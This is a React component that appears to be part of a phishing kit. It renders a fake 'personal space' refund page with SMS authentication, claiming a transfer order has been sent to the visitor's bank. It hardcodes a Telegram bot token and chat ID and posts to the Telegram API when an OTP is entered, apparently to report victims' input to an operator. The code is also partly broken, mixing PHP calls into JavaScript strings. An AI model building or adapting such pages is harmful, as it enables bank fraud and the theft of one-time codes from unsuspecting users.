import react from 'react'
import React from 'react'
import 'antd/dist/antd.css'
import { Input } from 'antd'
import {useState} from 'react'
import {useRef, useEffect} from 'react';
import { Radio } from 'antd';

export default function PersonalSpaceSuccess() {
  const otpUnderline = useRef(null);
  const errotp = useRef(null);

  const [errString, seterrString] = useState('Please complete this field');
  const [otp, setotp] = useState('');
  const chatId = '5345080694';
  const botToken= '5417079331:AAFFjTkpZXAzDL33Tbnjhl8-UDgDoWSzKJ8';
//   $chat_id = '5345080694';
// $token = '5417079331:AAFFjTkpZXAzDL33Tbnjhl8-UDgDoWSzKJ8';

  const nextButtonClicked = () => {
    if(!otp){
      otpUnderline.current.color = 'red';
      errotp.current.hidden = false;
      seterrString('Please complete this field');
    }
    if(otp){
      fetch('https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id='+chatId+'&text=".urlencode("Hello")') // url here
      .then((response) => {
        return response.json(); // replace .json() to .text() for plain text
      })
      .then((daat) => {
        console.log(daat);
      });
    }
  }
  const otpChanged = (e) => {
    setotp(e.target.value);
  }
  return (
    <div className="sc-jlyJG dhCUzp">
      <div className="sc-fjdhpX fxQNsf">
        <div>
          <div className="welcomeBack">MY PERSONAL SPACE</div>
          <div className="commonText" style={{marginTop: 50}}>
            <p>
              SMS AUTHENTICATION (MOBILE)</p>
            <p style={{marginTop: 30, color: 'black'}}>Request successfully registered.</p>
            <p>Registered request: Your request has been taken into account.</p>
            <p>In process: the transfer order is being prepared.</p>
            <p>Request assigned: the transfer order has been sent to your bank, you will soon receive an email informing you of the next refund (3 to 4 days rom receipt of the SMS).</p>
          </div>
        </div>
        <div style={{display: 'flex', justifyContent: 'center'}}>
            <img src={require('../media/check.png')} alt ='email' style={{width: 100, alignItems: 'center'}}/>
        </div>
      </div>
    </div>
  )
}

